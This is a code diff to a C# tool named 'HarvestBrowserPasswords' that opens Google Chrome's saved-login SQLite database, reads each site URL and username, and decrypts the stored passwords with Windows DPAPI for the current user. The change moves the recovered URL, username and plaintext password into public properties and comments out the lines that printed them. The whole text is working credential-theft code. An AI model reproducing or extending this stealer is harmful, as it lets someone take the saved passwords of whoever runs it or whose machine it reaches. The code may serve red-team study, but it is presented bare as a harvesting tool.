@@ -9,12 +9,16 @@ namespace HarvestBrowserPasswords
 {
     public class ChromeDatabaseDecryptor
     {
-        public string filePath;
+        public string FilePath { get; set; }
+        public string FormSubmitUrl { get; set; }
+        public string Username { get; set; }
+        public string Password { get; set; }
+
         public  ChromeDatabaseDecryptor(string databaseFilePath)
         {
-            this.filePath = databaseFilePath;
+            FilePath = databaseFilePath;
             SQLiteConnection sqliteConnection = new SQLiteConnection(
-                $"Data Source={filePath};" +
+                $"Data Source={FilePath};" +
                 $"Version=3;" +
                 $"New=True");
 
@@ -30,25 +34,28 @@ namespace HarvestBrowserPasswords
                 while (sqliteDataReader.Read())
                 {
                     //Store columns as variables
-                    string url = sqliteDataReader.GetString(0);
+                    FormSubmitUrl = sqliteDataReader.GetString(0);
                     //Avoid Printing empty rows
-                    if (url == "")
+                    if (FormSubmitUrl == "")
                     {
                         continue;
                     }
 
-                    string username = sqliteDataReader.GetString(1);
+                    Username = sqliteDataReader.GetString(1);
                     byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
 
                     try
                     {
                         //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                         byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
-                        string decryptedAscii = Encoding.ASCII.GetString(decryptedBytes);
-                        Console.WriteLine($"[+] Decrypted!");
-                        Console.WriteLine($"\tURL:      {url}");
-                        Console.WriteLine($"\tUsername: {username}");
-                        Console.WriteLine($"\tPassword: {decryptedAscii}");
+                        Password = Encoding.ASCII.GetString(decryptedBytes);
+                        Console.WriteLine($"[+] Decrypted Google Chrome Credentials for {FormSubmitUrl}!");
+                        /*
+                        Console.WriteLine($"\tURL:      {FormSubmitUrl}");
+                        Console.WriteLine($"\tUsername: {Username}");
+                        Console.WriteLine($"\tPassword: {Password}");
+                        */
+                        
                     }
                     catch (Exception e)
                     {
@@ -59,7 +66,7 @@ namespace HarvestBrowserPasswords
             }
             catch (Exception e)
             {
-                Console.WriteLine($"[!] Error connecting to database: {filePath}\nException: {e}");
+                Console.WriteLine($"[!] Error connecting to database: {FilePath}\nException: {e}");
             }
 
             sqliteConnection.Close();
